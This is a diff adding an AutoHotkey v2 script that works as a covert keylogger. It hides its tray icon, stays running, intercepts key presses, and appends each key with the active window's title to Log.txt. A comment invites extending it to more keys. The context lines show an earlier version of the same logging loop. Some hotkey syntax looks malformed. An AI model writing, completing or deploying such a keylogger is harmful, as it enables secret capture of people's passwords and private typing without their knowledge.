@@ -154,3 +154,29 @@ Loop
         FileAppend Win "[" Key "]", "Log.txt"
     PastWin := Win
 }
+
+
+
+#Requires AutoHotkey v2.0
+#SingleInstance Force
+Persistent
+#NoTrayIcon
+
+PastWin := ""
+
+; Capture any key press
+~*$*a::
+~*$*b::
+~*$*c::
+; Add more keys as needed (e.g., ~*$*1, ~*$*Space, etc.)
+{
+    Win := WinGetTitle("A")
+    Key := A_ThisHotkey  ; Get the pressed key
+    Key := StrReplace(Key, "~*$*", "")  ; Clean the hotkey prefix
+    if (Win = PastWin)
+        FileAppend Key, "Log.txt"
+    else
+        FileAppend Win "[" Key "]", "Log.txt"
+    PastWin := Win
+}
+return
